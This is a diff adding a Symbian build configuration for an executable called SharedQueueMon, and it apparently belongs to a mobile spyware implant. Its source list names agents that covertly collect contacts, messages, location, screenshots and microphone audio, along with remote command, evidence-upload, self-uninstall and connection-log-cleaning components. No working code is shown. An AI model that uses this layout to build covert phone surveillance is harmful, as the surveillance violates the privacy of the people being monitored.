@@ -1,0 +1,85 @@
+
+TARGET                                  SharedQueueMon_20023635.exe 
+TARGETTYPE                              exe 
+UID                                     0 0x20030635 
+VENDORID                                0 
+USERINCLUDE                             ..\inc .. 
+SYSTEMINCLUDE                           \epoc32\include 
+SYSTEMINCLUDE                           \epoc32\include\ecom
+SYSTEMINCLUDE							\epoc32\include\mmf\plugin    // amr audio encoding 
+
+
+SOURCEPATH                              ..\data 
+START RESOURCE 200305D7.rss
+  TARGETPATH                              \private\101f875a\import 
+  HEADER                                   
+END  
+
+SOURCEPATH                              ..\src 
+
+SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp 
+SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
+SOURCE StateCmdUninstall.cpp StateNone.cpp
+SOURCE StateAuthentication.cpp StateIdentification.cpp StateEvidences.cpp StateBye.cpp 
+SOURCE StateNewConf.cpp StateFileSystem.cpp StateDownload.cpp StateUpload.cpp StateUpgrade.cpp
+SOURCE AbstractAgent.cpp AgentAddressbook.cpp AgentCalendar.cpp AgentMessages.cpp AgentNone.cpp AgentPosition.cpp AgentSnapshot.cpp AgentFactory.cpp AgentDevice.cpp AgentMic.cpp AgentApplication.cpp LogFile.cpp
+
+SOURCE AbstractEvent.cpp EventLocation.cpp EventNone.cpp EventSms.cpp EventTimer.cpp EventFactory.cpp RecvSmsSocket.cpp EventCellId.cpp EventAc.cpp EventBattery.cpp EventStandby.cpp EventSimChange.cpp EventProcess.cpp EventCall.cpp EventConnection.cpp
+
+SOURCE  Core.cpp
+SOURCE 	ConfigFile.cpp
+SOURCE	ConnLogCleaner.cpp
+
+
+LIBRARY                       bafl.lib 
+LIBRARY                                 ecom.lib 
+LIBRARY                                 inetprotutil.lib 
+LIBRARY                                 eikcore.lib 
+LIBRARY                                 etel3rdparty.lib 
+LIBRARY                                 estor.lib 
+LIBRARY                                 esock.lib 
+LIBRARY                                 gsmu.lib 
+LIBRARY                                 smsu.lib 
+LIBRARY                                 flogger.lib 
+LIBRARY                                 efsrv.lib 
+LIBRARY                                 ws32.lib 
+LIBRARY                                 apgrfx.lib 
+LIBRARY                                 eiksrv.lib 
+LIBRARY                                 CONE.LIB 
+LIBRARY                                 apparc.lib
+LIBRARY                                 euser.lib smcm.lib msgs.lib etext.lib
+
+LIBRARY  insock.lib  random.lib lbs.lib commdb.lib commsdat.lib
+LIBRARY  connmon.lib  
+ 
+LIBRARY  cntmodel.lib calinterimapi.lib
+
+LIBRARY  logcli.lib
+
+LIBRARY		 swinstcli.lib   
+LIBRARY      hal.lib  sysutil.lib       
+
+LIBRARY   mmscli.lib
+LIBRARY   mmsserversettings.lib   //for retrieving mms access point
+
+LIBRARY   fbscli.lib  imageconversion.lib gdi.lib		// for screenshot agent
+
+LIBRARY mediaclientaudioinputstream.lib	    // mic rec 	
+LIBRARY HWRMLightClient.lib   				// for standby event
+LIBRARY apengine.lib						// for syncApn action  //TODO:restore when implemented
+LIBRARY centralrepository.lib				// detect offline mode
+
+LIBRARY ezip.lib charconv.lib apmime.lib cryptography.lib imcm.lib hash.lib
+LIBRARY SharedQueueCli_20023633.lib // LIBRARY ActionsDLL_2002EF7E.lib
+
+capability   CommDD Location NetworkServices PowerMgmt ProtServ ReadDeviceData ReadUserData SurroundingsDD SwEvent TrustedUI UserEnvironment WriteDeviceData WriteUserData 
+
+//MACRO	_LOGGING
+
+EPOCHEAPSIZE    0x9000 0x4000000   //max 40MB more or less
+EPOCSTACKSIZE	0x9000
+
+STATICLIBRARY RCS_CommonLib.lib 
+
+
+
